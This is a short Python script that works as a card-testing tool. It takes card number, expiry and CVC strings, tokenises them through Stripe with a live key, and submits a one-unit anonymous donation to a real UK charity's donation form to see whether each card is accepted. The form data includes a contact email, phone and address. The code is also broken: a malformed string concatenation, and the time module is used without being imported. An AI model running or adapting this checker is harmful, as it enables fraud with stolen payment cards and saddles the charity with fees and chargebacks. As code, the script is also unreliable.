import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
}	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&key=pk_live_51RyvtaQYLZ10vd7qtvU0QLUnKuouN1pGJoSoa75hW5X3DlwA7TdM9YKKjNsNBcNSJO2jE8hfK4Pwwc57aSLTPFbd00EB6U3LbS'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.selfhelp.org.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.selfhelp.org.uk/support-us/donate/',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

	params = {
    't': '1781959207856',
}
				
	data = {
    'data': 'item_4__fluent_sf=&__fluent_protection_token_4=jul6Y%2B1fqFaOlqXqDOb2eEAWdfpLOsU3b0p3RupBj8cVl0r235JwKdwj%2FZh1KqnantiESrAmskBM8MuGUx1%2FtchcG082C7Qa%2F4YzKb3K9zx2%2FP0d0UWlMocgNcPB7eIw&__fluent_form_embded_post_id=37&_fluentform_4_fluentformnonce=b809507751&_wp_http_referer=%2Fsupport-us%2Fdonate%2F&checkbox_1%5B%5D=I%20would%20like%20to%20donate%20anonymously%20&phone=%2B959976935052&email=bohtoobb%40gmail.com&address_1%5Baddress_line_1%5D=1295%20charleston&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=California&address_1%5Bstate%5D=Mountain%20View&address_1%5Bzip%5D=94043&address_1%5Bcountry%5D=US&description=For%20General&payment_input=Other%20amount&custom-payment-amount=1&payment_method=stripe&checkbox_2%5B%5D=&checkbox_3%5B%5D=&__stripe_payment_method_id='+str(pm)'',
    'action': 'fluentform_submit',
    'form_id': '4',
}

	
	r2 = requests.post(
    'https://www.selfhelp.org.uk/wp-admin/admin-ajax.php',
    params=params,
    headers=headers,
    data=data,
)
	time.sleep(3)
	return (r2.json())
